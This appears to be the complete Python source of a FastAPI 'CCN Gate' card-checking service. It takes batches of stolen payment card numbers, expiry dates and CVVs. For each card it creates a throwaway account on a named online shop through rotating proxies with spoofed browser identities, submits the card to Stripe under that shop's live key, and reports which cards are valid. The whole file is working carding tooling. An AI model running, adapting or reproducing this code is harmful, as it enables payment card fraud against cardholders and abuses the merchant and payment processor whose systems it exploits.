# app.py
import os
import uuid
import string
import random
import asyncio
from typing import List, Optional

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
from fake_useragent import UserAgent

# ---------------------------
# FastAPI App
# ---------------------------
app = FastAPI(title="CCN Gate API", version="1.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------
# Models
# ---------------------------
class CCRequest(BaseModel):
    cards: str  # "cc|exp|cvv,cc|exp|cvv,..."

class CCResponse(BaseModel):
    card: str
    status: str
    message: str
    proxy_used: Optional[str] = None

# ---------------------------
# Helpers
# ---------------------------
def load_proxies(path="proxies.txt"):
    with open(path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def generate_nonce(length=10):
    chars = string.hexdigits.lower()
    return ''.join(random.choice(chars) for _ in range(length))

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def get_session(proxy_line: str):
    """
    Creates a new AsyncClient with proxy configured.
    Returns: (session, proxy_url)
    """
    host, port, user, pwd = proxy_line.split(":")
    if "session-RANDOMID" in user:
        user = user.replace("session-RANDOMID", f"session-{uuid.uuid4().hex}")
    proxy_url = f"http://{user}:{pwd}@{host}:{port}"

    proxies = {
        "http://": proxy_url,
        "https://": proxy_url
    }

    session = httpx.AsyncClient(
        proxies=proxies,
        timeout=httpx.Timeout(60.0),
        trust_env=False,
        follow_redirects=True
    )
    return session, proxy_url

# ---------------------------
# Core Payment Function
# ---------------------------
async def create_payment_method(fullz: str, session: httpx.AsyncClient, proxy_url: str):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        user = "cristniki" + str(random.randint(1000, 999999))
        mail = f"{user}@gmail.com"

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9",
            "user-agent": UserAgent().random,
        }

        # STEP 1: register nonce
        register_nonce = generate_nonce()
        response = await session.get("https://www.biometricsupply.com/my-account/", headers=headers)
        register1_nonce = gets(response.text, 'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="', '" />')

        # STEP 2: register user
        data = {
            "email": mail,
            "woocommerce-register-nonce": register1_nonce,
            "_wp_http_referer": "/my-account/",
            "register": "Register",
        }
        await session.post("https://www.biometricsupply.com/my-account/", headers=headers, data=data)

        # STEP 3: add payment page
        response = await session.get("https://www.biometricsupply.com/my-account/add-payment-method/", headers=headers)
        setup_nonce = gets(response.text, '"createAndConfirmSetupIntentNonce":"', '","')

        # STEP 4: Stripe payment method
        data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "billing_details[address][country]": "PK",
            "key": "pk_live_51JeGcZCscllU4UB1q4R6Bz6qN5slFTiaNyC8eP5CdU6f3OcADOJIyI2lrTYcQsx9nOsHBdRdLAuRhO9mWFARqJxl00JcwCqa0V",
        }
        resp = await session.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data)

        try:
            pm_id = resp.json().get("id")
        except Exception:
            return {
                "card": fullz,
                "status": "error",
                "message": "Failed to create Stripe PM",
                "proxy_used": proxy_url
            }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': setup_nonce,
        }
        
        final = await session.post("https://www.biometricsupply.com/wp-admin/admin-ajax.php", headers=headers, data=data)

        # RESPONSE
        try:
            result = final.json()
            status = result.get("data", {}).get("status")
            error_message = result.get("data", {}).get("error", {}).get("message")

            if result.get("success") and status == "succeeded":
                return {"card": fullz, "status": "success", "message": "CCN ADDED SUCCESSFULLY", "proxy_used": proxy_url}
            elif error_message == "Your card has insufficient funds.":
                return {"card": fullz, "status": "success", "message": "Insufficient Funds", "proxy_used": proxy_url}
            elif status == "order_id":
                return {"card": fullz, "status": "charged", "message": "CCN $5 Charged", "proxy_used": proxy_url}
            elif status == "requires_action":
                return {"card": fullz, "status": "success", "message": "CCN (3DS/OTP)", "proxy_used": proxy_url}
            elif error_message == "Your card's security code is invalid.":
                return {"card": fullz, "status": "invalid_cvv", "message": "INVALID CVV", "proxy_used": proxy_url}
            elif error_message == "Your card's security code is incorrect.":
                return {"card": fullz, "status": "unknown", "message": "INVALID CVV", "proxy_used": proxy_url}
            elif error_message == "Your card was declined.":
                return {"card": fullz, "status": "declined", "message": "Card Declined", "proxy_used": proxy_url}
            elif error_message == "Your card was declined. You can call your bank for details.":
                return {"card": fullz, "status": "declined", "message": "Card Declined", "proxy_used": proxy_url}
            elif error_message == "Invalid account.":
                return {"card": fullz, "status": "declined", "message": "Invalid Account", "proxy_used": proxy_url}
            elif error_message == "Invalid account.":
                return {"card": fullz, "status": "declined", "message": "Invalid Account", "proxy_used": proxy_url}
            elif error_message == "502 Zone has reached usage limit":
                return {"card": fullz, "status": "error", "message": "Proxy Error", "proxy_used": proxy_url}
            elif error_message == "An error occurred while processing your card. Try again in a little bit.":
                return {"card": fullz, "status": "error", "message": "Card Error", "proxy_used": proxy_url}
            elif error_message == "We're not able to add this payment method. Please refresh the page and try again.":
                return {"card": fullz, "status": "unknown", "message": "Card Declined", "proxy_used": proxy_url}
            elif error_message == "Your card has expired.":
                return {"card": fullz, "status": "declined", "message": "Your card has expired.", "proxy_used": proxy_url}
            elif error_message == "Your card number is incorrect.":
                return {"card": fullz, "status": "invalid_card", "message": "Incorrect card number", "proxy_used": proxy_url}
            elif error_message == "Your card does not support this type of purchase.":
                return {"card": fullz, "status": "unsupported", "message": "Card does not support this type of purchase", "proxy_used": proxy_url}
            elif error_message == "card_error":
                return {"card": fullz, "status": "unsupported", "message": "Card type not Supported", "proxy_used": proxy_url}
            else:
                return {"card": fullz, "status": "unknown", "message": str(result), "proxy_used": proxy_url}
        except Exception:
            return {"card": fullz, "status": "error", "message": final.text, "proxy_used": proxy_url}

    except Exception as e:
        return {"card": fullz, "status": "error", "message": str(e), "proxy_used": proxy_url}

# ---------------------------
# Concurrent helper (one proxy/session per card)
# ---------------------------
async def _check_card_with_own_proxy(card: str, sem: asyncio.Semaphore):
    card = card.strip()
    if not card:
        return None

    # limit concurrency so we don't open too many sessions at once
    async with sem:
        proxy_line = random.choice(load_proxies())
        session, proxy_url = await get_session(proxy_line)
        try:
            return await create_payment_method(card, session, proxy_url)
        finally:
            await session.aclose()

# ---------------------------
# API ENDPOINTS
# ---------------------------
@app.get("/")
async def root():
    return {"message": "CCN Gate API is running"}

@app.get("/ccngate/{cards}", response_model=List[CCResponse])
async def check_cards_get(cards: str):
    card_list = [c.strip() for c in cards.split(",") if c.strip()][:5]

    # set concurrency limit (tune this to your environment / proxy provider limits)
    concurrency = min(5, len(card_list))
    sem = asyncio.Semaphore(concurrency)

    tasks = [asyncio.create_task(_check_card_with_own_proxy(card, sem)) for card in card_list]
    results = await asyncio.gather(*tasks)
    return [r for r in results if r is not None]

@app.post("/ccngate", response_model=List[CCResponse])
async def check_cards_post(request: CCRequest):
    card_list = [c.strip() for c in request.cards.split(",") if c.strip()][:5]

    concurrency = min(5, len(card_list))
    sem = asyncio.Semaphore(concurrency)

    tasks = [asyncio.create_task(_check_card_with_own_proxy(card, sem)) for card in card_list]
    results = await asyncio.gather(*tasks)
    return [r for r in results if r is not None]

# ---------------------------
# RUN
# ---------------------------
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
